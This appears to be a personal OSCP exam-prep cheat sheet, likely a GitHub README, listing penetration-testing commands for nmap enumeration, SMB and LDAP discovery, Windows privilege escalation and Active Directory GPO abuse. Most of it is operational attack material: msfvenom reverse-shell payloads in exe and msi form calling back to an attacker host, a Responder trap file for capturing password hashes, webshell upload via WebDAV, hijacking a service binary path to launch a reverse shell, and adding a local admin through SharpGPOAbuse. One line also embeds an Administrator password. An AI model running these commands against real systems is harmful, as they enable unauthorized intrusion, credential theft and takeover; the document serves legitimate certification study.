# OSCP Commands Cheat Sheet

Passed the 2023 version of the OSCP, these commands were gathered throughout practicing for the exam.


## Nmap Scans and Inital Enumeration

### Regular scans to do on every system:

`sudo nmap -sC -sV -T4 -Pn -oN nmapscan1.txt $ip` 

`sudo nmap -A -T4 -Pn -oN nmapscan2.txt $ip` 

`sudo nmap -p- -Pn -T5 -oN portscan.txt $ip` 

**UDP scan**

`sudo nmap -sU -sV -oN udpscan.txt --version-intensity 0 -F -n $ip`

if SNMP is open try SNMP walk


### **Enum4linux**

`enum4linux <IP>`

### LDAP

`nmap -sV --script “ldap* and not brute” <IP>`

### Scanning through a Pivot

`sudo proxychains nmap -vvv -sT --top-ports=60 -Pn -n $ip`

Scanning for win-rm and mssql

`proxychains nmap -vvv -sT -p 5985,5986,1433 -Pn -n $ip`

If its real down bad and slow

`proxychains nmap -sT 21,22,23,25,53,80,88,135,161,389,445,8000,8080,3389,5985,3306,3307,1433,5432 -iL <Filename>.txt <IP>`****

### Scanning for Vulnerabilities

smb scan:

`nmap -T5 -sV --script 'smb-vuln*' <IP>`

Very rare but just a common vuln scan:

`nmap -T5 -sU --top-ports 10000 <IP>`

# Windows Commands + Reminders / Priv esc

msfvenom quick shell:  

`msfvenom -p windows/shell/reverse_tcp LHOST=<hostIP> LPORT=<port> -f exe -o revshell.exe` 

### Usefull commands / Enumeration:

CMD

`whoami /groups`

`netstat -ano`

To list all active network connections we can use netstat11 with the argument -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection (Powershell)

`Get-LocalUser`

`Get-LocalGroup` or `Get-LocalGroupMember <group-name>`

`route print`

All 32 bit applications (Powershell):

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

All 64 bit applications (Powershell):

`Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

Files belonging to users (Powershell):

`Get-ChildItem -Path C:\Users\<username>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

Currently running processes (Powershell):

`Get-Process`

History of powershell of user and path (Powershell):

`(Get-PSReadlineOption).HistorySavePath`

Restart a service (Powershell): 

`Restart-Service -Name "<ServiceName>”`

Add color to windows GUI cmd for winpeas 

`reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

---

**Make SMB share for file transfer through firewall:**

on kali start SMB share

`python3 /usr/share/doc/python3-impacket/examples/smbserver.py share-dir /tmp -smb2support`

then on target behind firewall we can copy files like so:

`copy <FileName> \\<IP>\share-dir\<FileName>`

## Initial access reminders

**Check out LDAP scan always**

`enum4linux <IP>`

**LDAP SHIT and ldapsearch**

nmap enum info from ldap such as usernames and passwords

`nmap -sV --script “ldap* and not brute” <IP>`

can find usernames and possibly hints about where to go next with descripion of each account you get

`ldapsearch -x -b "DC=<dn>,DC=<dn>" "*" -H ldap://<IP> > <filename>.txt`

grep for `sAMAccountName` and `descriptions` 

**Responder**

If i can upload and download or delete anything in a SMBSHARE try running responder and doing so and see if hash of null session is recieved

`responder -I tun0 -v`

if hash is not grabbed from responder but we have write perms try making a .icon file

First make `.url` file

`touch <filename>.url` && `nano <filename>.url`

make the file like soo

```python
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\<IpOfResponsder>\%USERNAME%.icon
IconIndex=1
```

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/d8c82d06-5a91-4c61-9176-b1a345af52c8)

IP can be found in repsonder output, Example below on responder while running

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/f23d133f-8da0-436b-9920-c813cb05f491)

connect to SMB share and upload `.url` file

`put <filename>.url`

snag all the hashes and crack with `hashcat` or basic `John` command

`john <HashFile> /usr/share/wordlist/rockyou.txt` 

**Cadaver**

if WebDav is enabled on Web Server and have creds, can use `cadaver` to upload rev shell

scan to see if WebDav is enabled 

`nmap --script http-webdav-scan -p <WebServicePort> <IP>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/089e33e2-27c0-4473-aff7-ae72d618bac9)

Run Cadaver

`cadaver http://http://192.168.228.122/<IP>`

upload webshell (If IIS service upload aspx rev shell from the `/usr/share/webshells/aspx/cmdasp.aspx` directyory)

`put <Path-to-Webshell>`

Navigate to webshell in Web Browser and should be all good

---

### **Connecting to box with creds**

ssh with ssh key

`ssh -i <id_rsaKeyName> <IP>`

PsExec

`impacket-psexec <domain>/<username>:<password>@<IP>`

WinRM

`evil-winrm -i 10.10.135.154 -u Administrator -p hghgib6vHT3bVWf`

MSSQL

`impacket-mssqlclient -p 1433 <Username>[@](mailto:sql_svc@10.10.88.148)<IP> -windows-auth`

### Switch to user with creds and NO GUI

`runas /user:<username> cmd`


---

### Enumerating Service on windows box

Query Config of sevice

`sc.exe qc <name>`

Query current status of service

`sc.exe query <name>`

Modify config of service 

`sc.exe config <name> <option>= <value>`

Start/Stop service

`net start <name>`

`net stop <name>`

Get owner and access controls on service/script/file in powershell:

`Get-ACL <filename/path> | fl`

---

## Priv Esc

**ALWAYS CHECK TokenZ**

`whoami /priv`

Use `PrintSpoofer` or `GodPotato` if `SeImpersonatePrivilege`

(https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)

**Cached Credentials**

`cmdkey /list`

**Binary Hijacking and DLL hijacking**

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

**Unquoted Service Path’s**

`wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""”`

**Scheduled tasks**

`schtasks /query /fo LIST /v`

`schtasks /query /v /fo LIST | findstr /i "<username>*”`

`Get-ScheduledTask`

**Check AlwaysInstallElevated Registry**

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` if returns with `0x1` make an MSI, it'll run as SYSTEM OR winpeas output

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/fdedcc3f-9a15-4ea1-b493-a7ea31353932)

- then on kali

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi`

- finally on target

`msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

********Check installed applications********

- Run winpeas process-info and searchsploit interesting applications

`.\winPEASx64.exe quiet processinfo`

- or 

`.\seatbelt.exe NonstandardProcesses`

**Check for Windows backup files in C:\ directory**

**Check powershell history files**

`(Get-PSReadlineOption).HistorySavePath`

- Check it out manually by going to this path 

`C:\Users\<UserName>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`

**Check for database files**

`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

**Check for useful files in User's directory**

`Get-ChildItem -Path C:\Users\<Filename>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,.log,.kdbx,.xml -File -Recurse -ErrorAction SilentlyContinue`

`Get-ChildItem -Path C:\Users\<Username> -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`

`.log` `.kdbx` `.xml` literally any weird files in user's directory

**Check for XAMP path for databases:**

`Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

**Check env variables for passwords and such**

- outputs env variables:

`set`

**Finally run Winpeas + check for Vulnerable installed software and POWERUP**

**Weak Registry Perms from winPEAS**

- in winPEAS look for this vuln (next to list of vulnerable services)

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/47799c17-8d8a-4530-bf41-772c727aada5)

- Next open a powershell prompt and check permissions on groups, see if current user is in group

`Get-Acl <Registry_Path> | Format-List`

- If user is in group with RW, Full or Management cntrls, check if user can restart service in any way

checking for auto-start on restart
`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service_name>'}`

- or just `net stop` or `net start` and see if you can

- Next run `sc qc <service_name>` and look for “BINARY_PATH_NAME”

`sc qc <service_name>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/39ebbe57-b8f0-4423-af23-794cdc71893c)

- Finally, change binpath to reverse shell transferred onto the device

`sc config <name> binpath= "\"C:\Windows\Temp\<reverse_shell>"”`

**Check installed packages**

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

`Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

**Always Check for symlinks exploit**

**SharpGPOabuse (For AD environments/machines)**

- If we have “all” access to edit GPO’s (we can check with powerview) we can used SharpGPOabuse to escalate pirvs

- To start `transfer PowerView.ps1 to the target system` and `run "powershell" in shell on target`

- Next start `PowerView.ps1`

`.\PowerView.ps1` 

- In PowerView run and copy the “`Id`”

`Get-GPO -Name “Default Domain Policy”`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/284ce537-e6e9-4032-baad-02ce350eefa6)

- With the Id and in `PowerView.ps1` run this command

`Get-GPPermission -Guid <Id> -TargetType User -TargetName <CurruentUsername>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/f3e4bec8-ee58-46ee-a5b6-fbb114082715)

- If permissions are set as the same above (`GpoEditDeleteModiySecuirty`) Transfer Sharp (Download .exe here: https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master)

then run `ShapGPOAbuse.exe`

`.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <username> --GPOName "Default Domain Policy"`

- then update the GPO

`gpupdate /force`

- check if user is admin

`net user <username>`

DONE!@#$

### Great lil cheat sheet

https://github.com/isch1zo/Windows-PrivEsc-cheatsheat

---

